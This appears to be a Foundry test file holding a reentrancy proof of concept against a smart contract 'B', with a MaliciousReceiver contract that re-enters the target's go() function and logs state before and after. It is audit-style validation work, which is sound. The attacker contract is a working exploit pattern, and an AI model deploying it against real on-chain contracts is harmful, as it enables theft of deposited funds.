// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf29ebe930a539a60279ace72c707cba851a57707.sol";

contract ReentrancyTest is Test {
    B vulnerableContract;
    address constant TARGET_ADDRESS = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;

    receive() external payable {}

    function setUp() public {
        vulnerableContract = new B();
    }

    function testReentrancyExploit() public {
        console2.log("### Starting Reentrancy POC with Differential Validation ###");
        
        // Record state BEFORE exploration
        console2.log("--- BEFORE-Trigger State Snapshot ---");
        uint256 totalDepositsBefore = vulnerableContract.totalDeposits();
        uint256 totalWithdrawalsBefore = vulnerableContract.totalWithdrawals();
        uint256 attackerDepositsBefore = vulnerableContract.userDeposits(address(this));
        console2.log("Total Deposits: ", totalDepositsBefore);
        console2.log("Total Withdrawals: ", totalWithdrawalsBefore);
        console2.log("Test Contract Deposits: ", attackerDepositsBefore);
        console2.log("------------------------------------");
        
        // Setup environment
        MaliciousReceiver template = new MaliciousReceiver(payable(address(vulnerableContract)));
        vm.etch(TARGET_ADDRESS, address(template).code);
        
        uint256 initialBalance = 1 ether;
        deal(TARGET_ADDRESS, initialBalance);
        
        vm.store(
            TARGET_ADDRESS,
            bytes32(uint256(0)),
            bytes32(uint256(uint160(address(vulnerableContract))))
        );
        vm.store(
            TARGET_ADDRESS,
            bytes32(uint256(1)),
            bytes32(uint256(0))
        );
        
        // Critical attack execution
        console2.log("--- EXECUTE EXPLOIT TRIGGER ---");
        uint256 depositAmount = 1 ether;
        deal(address(this), depositAmount);
        vulnerableContract.go{value: depositAmount}();
        console2.log("--- END EXPLOIT TRIGGER ---");
        
        // Record state AFTER exploration
        console2.log("--- AFTER-Trigger State Snapshot ---");
        uint256 totalDepositsAfter = vulnerableContract.totalDeposits();
        uint256 totalWithdrawalsAfter = vulnerableContract.totalWithdrawals();
        uint256 attackerDepositsAfter = vulnerableContract.userDeposits(address(this));
        console2.log("Total Deposits: ", totalDepositsAfter);
        console2.log("Total Withdrawals: ", totalWithdrawalsAfter);
        console2.log("Test Contract Deposits: ", attackerDepositsAfter);
        
        // Detect state inconsistencies
        bool stateChanged = totalDepositsBefore != totalDepositsAfter ||
                           totalWithdrawalsBefore != totalWithdrawalsAfter || 
                           attackerDepositsBefore != attackerDepositsAfter;
        console2.log("-- State Change Detected:", stateChanged ? "YES" : "NO");
        console2.log("------------------------------------");
        
        // Count reentrant calls
        bytes32 countBytes = vm.load(TARGET_ADDRESS, bytes32(uint256(1)));
        uint256 callCount = uint256(countBytes);
        console2.log("Reentrancy Call Count:", callCount);
        
        // Final vulnerability verdict
        if (callCount == 2) {
            console2.log("Vulnerability Exists: Reentrancy confirmed with 2 calls");
        } else {
            console2.log("Vulnerability not Exist: Unexpected call count (%d)", callCount);
        }
    }
}

contract MaliciousReceiver {
    B public targetContract;
    uint256 public count;
    
    constructor(address payable _target) {
        targetContract = B(_target);
    }
    
    receive() external payable {
        count++;
        if (count <= 1) {
            targetContract.go{value: 0.1 ether}();
        }
    }
}